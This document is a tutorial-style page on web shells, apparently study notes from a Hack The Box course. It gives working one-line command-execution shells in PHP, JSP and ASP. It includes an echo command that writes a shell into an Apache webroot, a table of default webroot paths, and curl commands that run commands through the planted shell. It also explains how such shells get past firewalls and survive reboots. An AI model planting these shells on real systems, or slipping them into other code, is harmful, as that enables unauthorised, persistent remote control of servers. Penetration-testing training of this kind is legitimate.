# Web Shell

### php

```php
<?php system($_REQUEST["cmd"]); ?>
```

### jsp

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### asp

```aspnet
<% eval request("cmd") %>
```

## **Uploading a Web Shell**

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. <mark style="color:green;">`shell.php`</mark> and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

| Web Server                                 | Default Webroot        |
| ------------------------------------------ | ---------------------- |
| <mark style="color:green;">`Apache`</mark> | /var/www/html/         |
| <mark style="color:green;">`Nginx`</mark>  | /usr/local/nginx/html/ |
| <mark style="color:green;">`IIS`</mark>    | c:\inetpub\wwwroot\\   |
| <mark style="color:green;">`XAMPP`</mark>  | C:\xampp\htdocs\\      |

We can check these directories to see which webroot is in use and then use <mark style="color:green;">`echo`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a <mark style="color:green;">`PHP`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> shell with the following command:

```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

## **Accessing Web Shell**

Once we write our web shell, we can either access it through a browser or by using <mark style="color:green;">`cURL`</mark>. We can visit the <mark style="color:green;">`shell.php`</mark> page on the compromised website, and use <mark style="color:green;">`?cmd=id`</mark> to execute the <mark style="color:green;">`id`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> command:

![](https://academy.hackthebox.com/storage/modules/33/write\_shell\_exec\_1.png)

Another option is to use <mark style="color:green;">`cURL`</mark>:

```bash
lojique@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on <mark style="color:green;">`80`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> or <mark style="color:green;">`443`</mark>, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
